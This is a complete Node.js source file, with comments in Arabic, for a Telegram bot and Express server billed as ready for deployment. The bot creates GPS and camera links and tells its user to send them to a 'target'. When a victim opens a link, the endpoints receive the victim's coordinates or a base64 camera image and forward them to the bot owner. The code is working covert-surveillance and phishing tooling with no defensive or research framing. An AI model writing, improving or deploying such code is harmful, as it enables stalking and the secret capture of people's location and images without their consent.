// server.js - الإصدار النهائي الجاهز للنشر

import { JSONFilePreset } from 'lowdb/node';
import express from 'express';
import TelegramBot from 'node-telegram-bot-api';
import crypto from 'crypto';
import 'dotenv/config';
import { Buffer } from 'buffer';
import path from 'path';
import { fileURLToPath } from 'url';

// ------------------- 1. الإعدادات والمتغيرات الأساسية -------------------
const BOT_TOKEN = process.env.BOT_TOKEN;
const BASE_URL = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3000}`;
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

if (!BOT_TOKEN) {
    console.error("خطأ فادح: متغير BOT_TOKEN غير موجود. تأكد من إضافته في بيئة الاستضافة.");
    process.exit(1);
}

// ------------------- 2. إعداد قاعدة البيانات (LowDB) -------------------
const defaultData = { links: [] };
const db = await JSONFilePreset('db.json', defaultData);
console.log("تم الاتصال بقاعدة البيانات (LowDB) بنجاح.");

// ------------------- 3. إعداد البوت والخادم -------------------
const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ------------------- 4. منطق البوت -------------------
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, `👋 أهلاً بك!\n\nاختر نوع الرابط الذي تريد إنشاءه.`, {
        reply_markup: {
            keyboard: [[{ text: '📍 رابط GPS' }, { text: '📸 رابط صورة' }]],
            resize_keyboard: true,
            one_time_keyboard: false
        }
    });
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const linkId = crypto.randomBytes(8).toString('hex'); // زيادة طول المعرف
    let fullLink = '';
    let linkType = '';

    if (msg.text === '📍 رابط GPS') {
        fullLink = `${BASE_URL}/gps/${linkId}`;
        linkType = 'gps';
    } else if (msg.text === '📸 رابط صورة') {
        fullLink = `${BASE_URL}/camera/${linkId}`;
        linkType = 'camera';
    } else {
        return;
    }

    db.data.links.push({ linkId, ownerTelegramId: chatId, createdAt: Date.now(), status: 'pending', type: linkType });
    await db.write();
    bot.sendMessage(chatId, `🎉 تم إنشاء الرابط بنجاح!\n\nأرسله للهدف:\n${fullLink}`);
});

// ------------------- 5. منطق الخادم (Endpoints) -------------------
app.post('/api/save-location', async (req, res) => {
    const { lat, lon, linkId } = req.body;
    if (!lat || !lon || !linkId) return res.status(400).json({ message: "بيانات ناقصة." });
    const link = db.data.links.find(l => l.linkId === linkId && l.status === 'pending');
    if (!link) return res.status(404).json({ message: "الرابط غير صالح." });
    bot.sendMessage(link.ownerTelegramId, `🎯 **تم تحديد الموقع!**\nhttps://maps.google.com/?q=${lat},${lon}`, { parse_mode: 'Markdown' });
    link.status = 'completed';
    await db.write();
    res.status(200).json({ message: "تم الاستلام." });
});

app.post('/api/save-image', async (req, res) => {
    const { image, linkId } = req.body;
    if (!image || !linkId) return res.status(400).json({ message: "بيانات ناقصة." });
    const link = db.data.links.find(l => l.linkId === linkId && l.status === 'pending');
    if (!link) return res.status(404).json({ message: "الرابط غير صالح." });
    const imageBuffer = Buffer.from(image.split(';base64,').pop(), 'base64');
    bot.sendPhoto(link.ownerTelegramId, imageBuffer, { caption: "🎯 تم التقاط صورة بنجاح!" });
    link.status = 'completed';
    await db.write();
    res.status(200).json({ message: "تم الاستلام." });
});

app.get('/gps/:linkId', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/camera/:linkId', (req, res) => res.sendFile(path.join(__dirname, 'public', 'camera.html')));

// ------------------- 6. تشغيل الخادم -------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`\n✅ الخادم يعمل والبوت متصل على المنفذ ${PORT}`);
    if (!process.env.BASE_URL) {
        console.warn(`\n⚠️ تحذير: متغير BASE_URL غير معين. الروابط قد لا تعمل بشكل صحيح.\n`);
    }
});
